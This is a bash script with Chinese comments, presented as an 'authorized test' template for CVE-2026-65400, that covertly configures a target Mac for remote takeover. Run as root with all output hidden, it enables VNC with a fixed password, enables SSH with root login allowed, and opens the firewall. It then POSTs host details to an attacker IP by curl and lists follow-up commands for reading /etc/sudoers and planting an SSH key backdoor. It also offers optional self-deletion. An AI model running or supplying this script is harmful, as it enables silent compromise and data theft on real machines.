#!/bin/bash
# ============================================================
# CVE-2026-65400 授权测试 · 目标 Mac 静默配置脚本（模板）
# 用途：在被控方 Mac 上运行，自动开启所有被控条件，
#       关键信息通过 HTTP 直接发到攻击机，被控方屏幕无感知
# 执行方式：sudo bash setup_target_silent.sh <攻击机IP>
# 示例：    sudo bash setup_target_silent.sh 192.168.1.50
# ============================================================

# ---- 攻击机 IP（必填，用于回传信息）----
ATTACKER_IP="$1"
if [ -z "$ATTACKER_IP" ]; then
    echo "用法: sudo bash $0 <攻击机IP>"
    exit 1
fi
ATTACKER_PORT="${2:-8888}"

# ---- 检查 root ----
if [ "$EUID" -ne 0 ]; then
    echo "请用 sudo 执行"
    exit 1
fi

# ---- 所有输出静默（屏幕上不显示任何关键信息）----
exec >/dev/null 2>&1

# =============================================
# 1. 检查系统版本
# =============================================
OS_VERSION=$(sw_vers -productVersion)

version_lt() {
    [ "$(printf '%s\n' "$@" | sort -V | head -n 1)" = "$1" ]
}

VULN=false
if version_lt "$OS_VERSION" "14.8.9" && [[ "$OS_VERSION" == 14.* ]]; then
    VULN=true
elif version_lt "$OS_VERSION" "15.7.9" && [[ "$OS_VERSION" == 15.* ]]; then
    VULN=true
elif version_lt "$OS_VERSION" "26.6.1" && [[ "$OS_VERSION" == 26.* ]]; then
    VULN=true
fi

# =============================================
# 2. 开启屏幕共享（5900）
# =============================================
launchctl enable system/com.apple.screensharing 2>/dev/null
launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist 2>/dev/null

/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
    -activate -configure -access on \
    -clientopts -setvnclegacy -vnclegacy yes \
    -setvncpw -vncpw 'cve65400' \
    -restart -agent -console 2>/dev/null

sleep 1
SCREEN_OK="❌"
if lsof -iTCP:5900 -sTCP:LISTEN 2>/dev/null | grep -q LISTEN; then
    SCREEN_OK="✅"
fi

# =============================================
# 3. 开启 SSH（22）
# =============================================
systemsetup -setremotelogin on 2>/dev/null
launchctl enable system/com.openssh.sshd 2>/dev/null

if [ -f /etc/ssh/sshd_config ]; then
    sed -i '' 's/^PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config 2>/dev/null
    launchctl kickstart -k system/com.openssh.sshd 2>/dev/null
fi

sleep 1
SSH_OK="❌"
if lsof -iTCP:22 -sTCP:LISTEN 2>/dev/null | grep -q LISTEN; then
    SSH_OK="✅"
fi

# =============================================
# 4. 防火墙放行
# =============================================
FW_STATUS=$(/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null)
FW_OK="✅"
if echo "$FW_STATUS" | grep -qi "enabled"; then
    /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/libexec/screensharingd 2>/dev/null
    /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/sbin/sshd 2>/dev/null
    /usr/libexec/ApplicationFirewall/socketfilterfw --setallowsigned on 2>/dev/null
    FW_OK="✅"
fi

# =============================================
# 5. 采集本机信息
# =============================================
IP=$(ifconfig 2>/dev/null | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -n 1)
[ -z "$IP" ] && IP="未知"
HOSTNAME=$(scutil --get ComputerName 2>/dev/null || echo "未知")
USERNAME=$(whoami)
VNC_PASS="cve65400"

if [ "$VULN" = true ]; then
    VULN_TXT="✅ 有漏洞(未打补丁)"
else
    VULN_TXT="⚠️ 可能已打补丁"
fi

# =============================================
# 组装回传消息并发送到攻击机
# =============================================
MESSAGE="============================================
✅ 目标 Mac 已自动配置完成（静默模式）
============================================
目标IP:       $IP
主机名:       $HOSTNAME
当前用户:     $USERNAME
系统版本:     $OS_VERSION
漏洞状态:     $VULN_TXT
屏幕共享(5900): $SCREEN_OK
SSH(22):        $SSH_OK
防火墙放行:    $FW_OK
VNC密码:      $VNC_PASS
============================================
攻击机下一步命令：
  1) 验证漏洞:
     python3 exploit.py $IP /etc/sudoers
  2) 写SSH公钥后门:
     python3 exploit.py $IP -w ~/.ssh/id_ed25519.pub -m 0600 /var/root/.ssh/authorized_keys
  3) SSH登录:
     ssh -i ~/.ssh/id_ed25519 $USERNAME@$IP
  4) VNC连接:
     vnc://$IP:5900  (密码 $VNC_PASS)
============================================"

# 发送（多种方式尝试，保证至少一条通道成功）
curl -s -m 10 -X POST -d "$MESSAGE" "http://$ATTACKER_IP:$ATTACKER_PORT/" 2>/dev/null
curl -s -m 10 -X POST -d "$MESSAGE" "http://$ATTACKER_IP:8888/" 2>/dev/null

# 清理自身痕迹（可选，取消注释启用）
# rm -f "$0"

exit 0
